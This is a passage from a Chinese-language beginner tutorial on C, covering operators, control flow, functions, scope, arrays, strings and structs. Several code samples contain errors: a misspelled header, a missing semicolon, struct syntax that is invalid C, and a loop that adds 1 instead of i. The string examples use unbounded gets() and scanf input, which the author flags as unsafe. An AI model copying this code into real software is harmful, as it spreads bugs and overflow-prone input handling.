A&amp;amp;B = 0000 1100
A|B = 0011 1101
A^B = 0011 0001
~A = 1100 0011
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>c语言中实际的位运算符&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">位运算符&lt;/th>
&lt;th style="text-align:left">描述&lt;/th>
&lt;th style="text-align:left">实列&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">&amp;amp;&lt;/td>
&lt;td style="text-align:left">按位与操作，按二进制位进行&amp;quot;与&amp;quot;运算。&lt;/td>
&lt;td style="text-align:left">(A &amp;amp; B) 将得到 12，即为 0000 1100&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">|&lt;/td>
&lt;td style="text-align:left">按位或运算符，按二进制位进行&amp;quot;或&amp;quot;运算。&lt;/td>
&lt;td style="text-align:left">(A | B) 将得到 61，即为 0011 1101&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">^&lt;/td>
&lt;td style="text-align:left">异或运算符，按二进制位进行&amp;quot;异或&amp;quot;运算。&lt;/td>
&lt;td style="text-align:left">(A ^ B) 将得到 49，即为 0011 0001&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">~&lt;/td>
&lt;td style="text-align:left">取反运算符，按二进制位进行&amp;quot;取反&amp;quot;运算。&lt;/td>
&lt;td style="text-align:left">(~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;laquo;&lt;/td>
&lt;td style="text-align:left">二进制左移运算符。将一个运算对象的各二进制位全部左移若干位（左边的二进制位丢弃，右边补0）。&lt;/td>
&lt;td style="text-align:left">A &amp;laquo; 2 将得到 240，即为 1111 0000&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">&amp;raquo;&lt;/td>
&lt;td style="text-align:left">二进制右移运算符。将一个数的各二进制位全部右移若干位，正数左补0，负数左补1，右边丢弃。&lt;/td>
&lt;td style="text-align:left">A &amp;raquo; 2 将得到 15，即为 0000 1111&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="条件选择语句">条件选择语句&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>c语言把任意非零，非空的值定义为true，把零或null定义为false&lt;/strong>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;h3 id="基本if语句">基本if语句&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
if (1) printf(&amp;quot;hallo &amp;quot;);
if (true) {
printf(&amp;quot;world&amp;quot;);
}
int x=10;
if (x) printf(&amp;quot;\n&amp;quot;);
//求a,b,c种的最大值
int a=5,b=2,c=3;
int ans;
if (a&amp;gt;b){
ans=a;
}
else{
if (b&amp;gt;c){
ans=b;
}
else{
ans=c;
}
}
printf(&amp;quot;a=%d,b=%d,c=%d\nMax=%d\n&amp;quot;,a,b,c,ans);
// &amp;amp;&amp;amp;且 ||或
if (a&amp;gt;b &amp;amp;&amp;amp; b&amp;gt;c) printf(&amp;quot;a\n&amp;quot;);
if (a&amp;gt;b || b&amp;gt;c) printf(&amp;quot;b\n&amp;quot;);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>输出如下&lt;/p>
&lt;pre tabindex="0">&lt;code>hallo world
a=5,b=2,c=3
Max=5
b
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>重点&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>c语言的条件判断语句具有短路性质&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>在用&amp;amp;&amp;amp;连接的两个表达式A，B中。如果A的运算值为false，那么表达式B不会运算&lt;/li>
&lt;li>在用||连接的两个表达式A，B中。如果A的运算值为true，那么表达式B不会运算&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int a=1,b=2,c=3;
if (a&amp;gt;b &amp;amp;&amp;amp; ++a) printf(&amp;quot;Yes\n&amp;quot;);
//这里由于a&amp;gt;b不成立，所以a++不会被执行，所以a的值仍然为1,当然prinft语句也不会被执行
if (a&amp;lt;b &amp;amp;&amp;amp; ++a) printf(&amp;quot;%d\n&amp;quot;,a);
//这里由于a&amp;lt;b成立，所以a++也会被执行，这里会运行输出a数值2
if (b&amp;lt;c || ++b) printf(&amp;quot;%d\n&amp;quot;,b);
// ||也是如此，由于b&amp;lt;c成立，于是b++也不会被执行，输出b的数值为2
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>2
2
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="三元运算符">三元运算符&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int n;
printf(&amp;quot;请输入一个数字：&amp;quot;);
scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);
(n&amp;gt;0)?printf(&amp;quot;正数\n&amp;quot;):printf(&amp;quot;负数\n&amp;quot;);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输入&lt;/p>
&lt;pre tabindex="0">&lt;code>请输入一个数字：12
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>正数
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>如上的三元运算符可以近似写成如下的if语句：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>if (n&amp;gt;0) {
printf(&amp;quot;正数&amp;quot;);
}
else {
printf(&amp;quot;负数&amp;quot;);
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="switch语句">switch语句&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int n;
printf(&amp;quot;请输入一个数字：&amp;quot;);
scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);
switch (n){
case 1: printf(&amp;quot;this is case 1\n&amp;quot;);
case 2: printf(&amp;quot;this is case 2\n&amp;quot;); break;
default:
printf(&amp;quot;this is default\n&amp;quot;);
}
return 0;
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>样例输入1&lt;/p>
&lt;pre tabindex="0">&lt;code>1
&lt;/code>&lt;/pre>&lt;p>样例输出1&lt;/p>
&lt;pre tabindex="0">&lt;code>this is case 1
this is case 2
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>样例输入2&lt;/p>
&lt;pre tabindex="0">&lt;code>2
&lt;/code>&lt;/pre>&lt;p>样例输出2&lt;/p>
&lt;pre tabindex="0">&lt;code>this is case 2
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>样例输入3&lt;/p>
&lt;pre tabindex="0">&lt;code>3
&lt;/code>&lt;/pre>&lt;p>样例输出3&lt;/p>
&lt;pre tabindex="0">&lt;code>this is default
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>重点&lt;/p>
&lt;/li>
&lt;li>
&lt;p>每一个case语句分支必须以break;（即返回）结尾，否则case的条件分支都会继续往下执行。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="循环语句">循环语句&lt;/h2>
&lt;ol>
&lt;li>
&lt;h3 id="for循环">for循环&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
// 统计1加到100的和
int i;
int ans=0;
for (i=0;i&amp;lt;=100;i++){
ans=ans+i;
}
printf(&amp;quot;%d\n&amp;quot;,ans);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>5050
&lt;/code>&lt;/pre>&lt;p>下面是 for 循环的控制流：&lt;/p>
&lt;pre tabindex="0">&lt;code>for ( init; condition; increment )
{
statement(s);
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>init 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。&lt;/li>
&lt;li>接下来，会判断 condition。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。&lt;/li>
&lt;li>在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。该语句可以留空，只要在条件后有一个分号出现即可。&lt;/li>
&lt;li>条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。&lt;/li>
&lt;/ul>
&lt;p>在VC 6.0中不支持在init中声明循环控制变量，只允许使用上面的样例代码，否则会有&lt;/p>
&lt;pre tabindex="0">&lt;code>[Error] 'for' loop initial declarations are only allowed in C99 or C11 mode
&lt;/code>&lt;/pre>&lt;p>错误，在比较新版本的编译器中，如下写法是被支持的&lt;/p>
&lt;pre tabindex="0">&lt;code>for (int i=0;i&amp;lt;=100;i++) {
ans=ans+1;
}//并且，这里的i变量在循环体结束之后就会被释放销毁，即你在循环体之外是无法再次使用i变量的。
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="while循环">while循环&lt;/h3>
&lt;pre tabindex="0">&lt;code>//求1~100内奇数的和
#include&amp;lt;stdio.h&amp;gt;
int main(){
int i=1;
int ans=0;
while (i&amp;lt;=100){
ans+=i;
i+=2;
}
}
&lt;/code>&lt;/pre>&lt;p>执行逻辑&lt;/p>
&lt;pre tabindex="0">&lt;code>while(condition)
{
statement(s);
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>在这里，statement(s) 可以是一个单独的语句，也可以是几个语句组成的代码块。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>condition 可以是任意的表达式，当为任意非零值时都为 true。当条件为 true 时执行循环。 当条件为 false 时，退出循环，程序流将继续执行紧接着循环的下一条语句。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="do-while循环">do while循环&lt;/h3>
&lt;pre tabindex="0">&lt;code>//计算100以内偶数的和
#include&amp;lt;stido.h&amp;gt;
int main(){
int i=2;
int ans=0;
do{
ans+=i;
i+=2;
}while(i&amp;lt;=100)
}
&lt;/code>&lt;/pre>&lt;p>执行逻辑&lt;/p>
&lt;pre tabindex="0">&lt;code>do
{
statement(s);
}while( condition );
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>与while循环不同的是，条件表达式出现在循环的尾部，所以循环中的 statement(s) 会在条件被测试之前至少执行一次。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果条件为真，控制流会跳转回上面的 do，然后重新执行循环中的 statement(s)。这个过程会不断重复，直到给定条件变为假为止。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="函数">函数&lt;/h2>
&lt;ol>
&lt;li>
&lt;h3 id="c语言中的函数声明">C语言中的函数声明：&lt;/h3>
&lt;pre tabindex="0">&lt;code>返回值类型 函数名(参数类型 参数1,参数类型 参数2 ···){
函数主体
}
实列：
//求a，b中的最大值，并返回该最大值
int Max(int a,int b){
int ret;
(a&amp;gt;=b)?ret=a:ret=b;//还记的这个三元运算符吗？
return ret;
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="函数调用">函数调用&lt;/h3>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int Max(int a,int b) {
int ret;
(a&amp;gt;=b)?ret=a:ret=b;
return ret;
}
int main() {
int a=10,b=20;
printf(&amp;quot;%d\n&amp;quot;,Max(a,b));
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>20
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;h3 id="函数参数">函数参数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>值传递&lt;/p>
&lt;/li>
&lt;li>
&lt;p>c语言默认多数为是传值调用，把参数的实际值赋给函数内的形式参数，在这种情况下在函数内部修改形式参数的值并不会影响实际参数,例子：&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
//函数作用：交换ab的值，这是交换两个数常用写法。
void swap(int a,int b){
int t;
t=a;
a=b;
b=t;
}
int main(){
int a=10,b=20;
printf(&amp;quot;a=%d,b=%d\n&amp;quot;,a,b);
swap(a,b);
printf(&amp;quot;a=%d,b=%d\n&amp;quot;,a,b);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>a=10,b=20
a=10,b=20
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>如你所见，默认情况下在函数内部对传入参数做修改并不会影响实际参数的值&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你想真的向修改传入参数的值，那么就要使用下面将会提到的引用传递(引用传递的实质就是指针的运用)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>引用传递&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
void swap(int *a,int *b){
int t=*a;
*a=*b;
*b=t;
}
int main(){
int a=10,b=20;
printf(&amp;quot;a=%d,b=%d\n&amp;quot;,a,b);
swap(&amp;amp;a,&amp;amp;b);
printf(&amp;quot;a=%d,b=%d\n&amp;quot;,a,b);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>a=10,b=20
a=20,b=10
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;ol>
&lt;li>
&lt;h3 id="作用域规则">作用域规则&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>作用域指程序定义的变量所存在的区域，超过这个区域，变量就不能被访问。C语言中我们可以在三处地方声明变量：&lt;/p>
&lt;ol>
&lt;li>在函数或者块（这里的块可以是for循环那个的init还记得吗）内部的局部变量&lt;/li>
&lt;li>在所有函数外部的全局变量&lt;/li>
&lt;li>在函数参数中定义的形式参数变量&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>程序查看变量存在并访问的优先级顺序永远是先局部再全局（在某种程度上我们也可以把函数参数声明中定义的形式参数也理解为一种局部变量）&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
//全局变量
int g=10;
void func1(int g){
printf(&amp;quot;in func1 g=%d\n&amp;quot;,g);
return;
}
void func2(){
printf(&amp;quot;in func2 g=%d\n&amp;quot;,g);
return;
}
int main(){
//局部变量
int x=20,g=30;
printf(&amp;quot;in main x=%d,g=%d\n&amp;quot;,x,g);
func1(x);//我们把x=20的值赋值给形式参数g
func2();
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>in main x=20,g=30
in func1 g=20
in func2 g=10
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>在main()函数中尝试访问x,g的值并输出显示，程序优先查看局部变量中是否存在x,g,存在于是输出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>in main x=20,g=30
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>因为局部变量声明了一个g，所以这里并不会访问全局的g&lt;/li>
&lt;li>在func1()中我们尝试访问变量g，因为变量g在函数参数部分存在声明，是一个形式参数。所以也不会去访问全局变量g。于是输出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>in func1 g=20
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>即传入的x的值。&lt;/li>
&lt;li>在func2()中，我们没有在函数内部声明任何局部变量，形式参数，于是这里尝试访问变量g就是访问的全局变量的值，输出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>in func2 g=10
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>重点&lt;/p>
&lt;/li>
&lt;li>
&lt;p>全局变量被保存在内存的全局存储区中，占用静态存储空间，并且会被初始化。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>局部变量被保存在一种称为栈的结构中，只有在函数被调用的时候才会真正的被分配存储空间&lt;/p>
&lt;/li>
&lt;li>
&lt;p>局部变量被定义的时候，系统不会对其进行初始化（虽然多数情况下不初始化数值也多为0）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>全局变量系统会自动进行初始化，初始化值如下&lt;/p>
&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">数据类型&lt;/th>
&lt;th style="text-align:left">初始化默认值&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">int&lt;/td>
&lt;td style="text-align:left">0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">char&lt;/td>
&lt;td style="text-align:left">&amp;lsquo;\0&amp;rsquo;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">float&lt;/td>
&lt;td style="text-align:left">0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">double&lt;/td>
&lt;td style="text-align:left">0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">pointer(指针)&lt;/td>
&lt;td style="text-align:left">NULL&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="进阶数据结构">进阶数据结构&lt;/h2>
&lt;ol>
&lt;li>
&lt;h3 id="数组">数组&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>数组，是可以存储大小固定类型相同并且个数固定的顺序集合。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>声明方法：&lt;/p>
&lt;pre tabindex="0">&lt;code>数据类型 数组名称[数组大小];
&lt;/code>&lt;/pre>&lt;p>示例：&lt;/p>
&lt;pre tabindex="0">&lt;code>int a[100];
/*
这个实例里我们就定义了一个长度为100的数组，可以存储100个int型数据
*/
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>&lt;strong>注意：C语言中的数组下标从0开始，这里我们定义了一个长度为100的数组a，但是其下标范围事实上是从0到99&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;/li>
&lt;li>
&lt;p>数组初始化&lt;/p>
&lt;pre tabindex="0">&lt;code>int a[10]={0};
//声明一个大小为10的整形数组，并初始化所有元素为0
//还记得吗，下标从0开始哦，0~9
double a[]={0.0,1.1,2.2,3.3}
//你也可以为数组里每个元素单独初始化，如果你这么做的话还可以省略方括号里的数组大小（这个数组大小为4）
int a[10]={0,1,2,3}
//如果规定了数组大小但是没有把每个元素单独赋值，未赋值部分依据上面提到的默认初始化规则初始化。
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;p>数组元素访问&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
//声明一个大小为100的int型数组并初始化所有值为0
int a[100]={0};
//将数组所有元素赋值为1~100
for (int i=0;i&amp;lt;100;i++){
//我们通过 数组名[下标] 的方式访问数组元素
a[i]=i+1;
}
//我们计算数组里所有元素的累加和，即1-100的累加和
int ans=0;
for (int i=0;i&amp;lt;100;i++){
ans+=a[i];
}
//样例输出5050
printf(&amp;quot;%d\n&amp;quot;,ans);
return 0;
}
&lt;/code>&lt;/pre>&lt;hr>
&lt;/li>
&lt;li>
&lt;p>数组在函数之间的传参&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
//计算a数组内所有元素的平均值
double func(int* a,int size){
double average=0;
for (int i=0;i&amp;lt;size;i++)
average+=a[i];
return average/(double)size;
}
/*
其实你可以发现数组传参的方法就是一个“引用传参”
所以数组使用这种方法进行函数传参是可以修改数组元素的
数组函数传参还有别的写法，但是这里只讲解这一种。
希望你养成一个好习惯，数组传参务必带上数组大小
*/
int main(){
//声明初始化一个数组a
int a[5]={1,2,3,4,5};
//打印平均值
printf(&amp;quot;%lf\n&amp;quot;,func(a,5));/
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>数组的本质（重点）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数组本质是一个在内存中线性连续的存储空间&lt;/p>
&lt;/li>
&lt;li>
&lt;p>你在声明数组的时候事实上获得的是一个这个空间的地址&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数组下标就是相对于数组地址的一个偏移量用来确定内部元素的位置&lt;/p>
&lt;/li>
&lt;li>
&lt;p>C语言中你要时刻注意数组下标，因为下标越界有时是不会报错的。&lt;/p>
&lt;p>你声明了一个&lt;/p>
&lt;pre tabindex="0">&lt;code>int a[10]={0}
&lt;/code>&lt;/pre>&lt;p>的数组，你可以使用如下的循环来遍历它&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
int a[10]={0};
for(int i=0;i&amp;lt;=10;i++)
printf(&amp;quot;%d &amp;quot;,a[i]);
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>0 0 0 0 0 0 0 0 0 0 1
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>我设置了循环条件是i&amp;lt;=10,但是你还记得吗？c语言数组下标从0开始！！！&lt;/p>
&lt;/li>
&lt;li>
&lt;p>所以这里输出了11个数字。你也发现了，我明明初始化了所有的数组元素为0，但是最后却多输出了一个1。这里就是因为我们越界访问。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>最后这个数字1不属于数组的元素，但是你依旧可以访问它。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>所以每当你尝试访问数组的时候，请千万注意数组下标越界问题。因为不检查数组下标越界已经在计算机界造成了许许多多的重大安全问题。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;ol>
&lt;li>
&lt;h3 id="字符数组">字符数组&lt;/h3>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>字符数组本质还是数组，在大多数情况下和基本数组的操作方式类似。所以接下来我们只讲解字符串数组某些特殊操作。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>字符数组声明以及初始化&lt;/p>
&lt;pre tabindex="0">&lt;code>/*
还记的\0吗，截止符
字符数组内存储的字符串的末尾必须有截止符！
*/
char name[6]={'h', 'e', 'l', 'l', 'o', '\0'};
//你还可以用这个写法.
char greeting[]=&amp;quot;hello&amp;quot;;
//初始化部分元素也是可以滴
char name[20]=&amp;quot;xiaoming&amp;quot;;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>字符数组的遍历&lt;/p>
&lt;p>因为字符串数组末尾必定有截止符的特性，我们有了一些常用的遍历字符数组的方法：&lt;/p>
&lt;pre tabindex="0">&lt;code>char str[]=&amp;quot;hello world&amp;quot;;
for (int i=0;str[i]!=0;i++){
···
}
int i=0;
while(str[i]!=0){
···
i++;
}
&lt;/code>&lt;/pre>&lt;p>当然你也可以获取字符串长度，然后设定下标i小于等于字符串长度的时候执行循环，不过那样就和普通数组没有区别音次不在此举例。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>字符串的输入输出&lt;/p>
&lt;pre tabindex="0">&lt;code>char str[100];
//输入字符串
gets(str);
scanf(&amp;quot;%s&amp;quot;,&amp;amp;str);
//输出字符串
puts(str);
printf(&amp;quot;%s\n&amp;quot;,str);
/*
之前说到在数组处理，越界并不会被报错
所以这里的输入都存在着极大的安全隐患，于是在Visual studio的最新版本里，出于安全考虑
在默认情况下不允许使用以上函数读取字符串。下面提到的C语言字符串处理函数也是一样，都存在了越界问题
因而在最新的VS中默认不允许使用，这也是我不推荐使用最新版本的VS的原因
*/
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>C语言自带的字符串处理函数&lt;/p>
&lt;ul>
&lt;li>以下函数使用需引入头文件string.h（还记得怎么引入头文件吗？#include&amp;lt;string.h&amp;gt;）&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">函数&lt;/th>
&lt;th style="text-align:left">作用&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">strcpy(s1,s2);&lt;/td>
&lt;td style="text-align:left">复制字符串s2到字符串s1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strcat(s1,s2);&lt;/td>
&lt;td style="text-align:left">连接字符串s2到s1末尾&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strlen(s);&lt;/td>
&lt;td style="text-align:left">获取字符串s长度&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strcmp(s1,s2);&lt;/td>
&lt;td style="text-align:left">如果 s1 和 s2 是相同的，则返回 0；如果 s1&amp;lt;s2 则返回小于 0；如果 s1&amp;gt;s2 则返回大于 0。（这里的s1 s2基于字符数组内的字符的字典序判定）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strchr(s1,ch);&lt;/td>
&lt;td style="text-align:left">返回一个指针，只想字符串s1中字符ch第一次出现的位置&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">strstr(s1,s2);&lt;/td>
&lt;td style="text-align:left">返回一个指针，指出字符串s1在字符串s2中年第一次出现的位置&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>重点&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sizeof()与strlen()函数对字符串的差别&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sizeof()函数获取变量所占空间大小&lt;/p>
&lt;/li>
&lt;li>
&lt;p>strlen()获取字符串长度&lt;/p>
&lt;p>sizeof()函数是可以对任何变量使用的，但是strlen()是字符串专属函数&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
int main(){
char name[]=&amp;quot;xiaoming&amp;quot;;
printf(&amp;quot;size of name=%d\n&amp;quot;,sizeof(name));
printf(&amp;quot;strlen of name=%d\n&amp;quot;,strlen(name));
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>size of name=9
strlen of name=8
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>strlen()函数统计字符数组内存储的字符串长度并且不包括截止符&lt;/li>
&lt;li>sizeof()函数统计字符数组所占的空间大小！&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>补充:&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
int main(){
char name[20]=&amp;quot;xiaoming&amp;quot;;
printf(&amp;quot;size of name=%d\n&amp;quot;,sizeof(name));
printf(&amp;quot;strlen of name=%d\n&amp;quot;,strlen(name));
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>size of name=20
strlen of name=8
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ol>
&lt;li>
&lt;h3 id="结构体">结构体&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>有的时候你可能在想，我需要在程序里存储一个人，或者多个人的身份数据，包括姓名，年龄，出生年月一类的时候咋办？我们当然会希望把这些数据放在一起组织起来，而不是用N多个变量分别存储。于是！结构体就应运而生。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>我们直接以上面的例子来：情景假设我们要存储一个班级学生的信息。&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;stdio.h&amp;gt;
int main(){
//首先定义一个结构体DATE来存储出生年月
struct DATE{
short year; //年
short month;//月
short day; //日
};
//定义学生信息结构体StudentInfo
struct StudentInfo{
char name[20]={0}; //姓名
DATE date; //出生年月，对!结构体也可以嵌套定义
};
//对，我们要存储一个班的学生，50人
StudentInfo student[50];
for (int i=0;i&amp;lt;50;i++){
printf(&amp;quot;输入第%d个学生信息：\n&amp;quot;,i+1);
//我们使用结构体名称加“.”的方式来访问结构体内部元素
printf(&amp;quot;学生姓名：&amp;quot;); scanf(&amp;quot;%s&amp;quot;,&amp;amp;student[i].name);
printf(&amp;quot;学生出生年月日：&amp;quot;);
scanf(
&amp;quot;%d-%d-%d&amp;quot;,
&amp;amp;student[i].date.year,
&amp;amp;student[i].date.month,
&amp;amp;student[i].date.day
);
};
for (int i=0;i&amp;lt;50;i++){
printf(&amp;quot;%s\n&amp;quot;,student[i].name);
printf(
&amp;quot;%d-%d-%d&amp;quot;,
student[i].date.year,
student[i].date.month,
student[i].date.day
);
};
return 0;
}
&lt;/code>&lt;/pre>&lt;p>样例输入&lt;/p>
&lt;pre tabindex="0">&lt;code>输入第1个学生信息：
学生姓名：xiaoming
学生出生年月日：1992-12-21
&lt;/code>&lt;/pre>&lt;p>样例输出&lt;/p>
&lt;pre tabindex="0">&lt;code>xiaoming
1992-12-21
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>我们通过如下格式声明结构体&lt;/p>
&lt;pre tabindex="0">&lt;code>struct 结构体类型名{
基本数据类型 变量名;
基本数据类型 变量名;
...
}
&lt;/code>&lt;/pre>&lt;ul>
